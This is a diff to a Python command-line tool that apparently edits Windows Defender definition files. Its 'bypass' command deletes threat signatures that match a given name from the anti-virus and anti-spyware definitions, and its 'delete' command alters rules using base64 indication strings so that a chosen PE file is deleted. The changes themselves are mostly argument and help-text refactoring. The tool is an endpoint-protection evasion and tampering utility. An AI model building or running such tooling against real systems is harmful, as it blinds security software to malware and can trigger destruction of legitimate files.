@@ -21,14 +21,15 @@ def get_defualt_definition_update_path() -> str:
 
 def router(args, definitions: Definitions):
     if args.command == 'bypass':
-        match_str = args.match
-        logging.info("Deleting All Threats From Anti-Virus Definitions")
-        BypassEDRRule(definitions.get_anti_virus_definitions(), match_str).run()
-        logging.info("Deleting All Threats From Anti-Spyware Definitions")
-        BypassEDRRule(definitions.get_anti_spayware_definitions(), match_str).run()
+        logging.info("Enumerating Anti-Virus Definitions")
+        BypassEDRRule(definitions.get_anti_virus_definitions(), args.threat_name).run()
+
+        logging.info("Enumerating Anti-Spyware Definitions")
+        BypassEDRRule(definitions.get_anti_spayware_definitions(), args.threat_name).run()
     elif args.command == 'delete':
         string = base64.b64decode(args.string)
         hstrs = [string]
+
         DeletePEMockFile(definitions.get_anti_spayware_definitions(), hstrs).run()    
     else:
         logging.error(f"Unrecognized command: {args.command}")
@@ -38,18 +39,15 @@ def router(args, definitions: Definitions):
 
 def argument_parser():
     options = argparse.ArgumentParser(usage="%(prog)s command [options]", add_help = True, description = "Windows Defender Update")
-    options.add_argument('-o', default='.', help='output folder for the exported vdm files')
-    options.add_argument('-d', default=get_defualt_definition_update_path(), help='set explicit definition update path')
+    options.add_argument('-o', metavar='OUTPUT', default='.', help='output folder for the exported vdm files')
+    options.add_argument('-d', metavar='DEFINITIONS_PATH', default=get_defualt_definition_update_path(), help='set explicit definitions path')
     subparsers = options.add_subparsers(dest='command', required=True)
 
-    bypass_subparser = subparsers.add_parser('bypass', help='bypass windows defender threats')
-    bypass_group = bypass_subparser.add_mutually_exclusive_group()
-    bypass_group.add_argument('-match', help="delete all threats that his name containes <name>")
-    bypass_group.add_argument('-name', help="delete threat by name")
-    bypass_group.add_argument('-id', help="delete threat by his id")
+    bypass_subparser = subparsers.add_parser('bypass', help='bypass windows defender rules by threat name')
+    bypass_subparser.add_argument('threat_name', type=str, help="delete all threats matching <threat_name>")
     
-    delete_parser = subparsers.add_parser('delete', help='delete file by modifiyng rules')
-    delete_parser.add_argument('--string', help='indication strings within the pefile (base64)', required=True)
+    delete_parser = subparsers.add_parser('delete', help='delete file by modifying rules')
+    delete_parser.add_argument('string', type=str, help='indication strings within the pefile (base64)')
     
     return options.parse_args()
 
